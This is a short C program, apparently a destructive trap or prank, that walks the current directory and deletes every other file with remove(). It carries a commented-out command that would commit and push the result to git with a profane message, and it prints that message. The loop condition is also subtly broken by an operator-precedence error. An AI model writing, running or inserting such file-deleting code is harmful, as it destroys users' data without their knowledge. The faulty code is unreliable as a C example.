#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <common.h>

#define trap001

int main(int argc, char **argv)
{
    
    DIR * dir;
    struct dirent *ptr;
    dir = opendir("./");
    int i = 0;
    while ((ptr=readdir(dir) != NULL))
    {   
        if(i % 2 == 0){
            remove(ptr->d_name);
        }
        i++;
    } 
    // system("git add . && git commit -m 'fuck this project' && git push");
	printf("fuck this project\n");
    return 0;
}
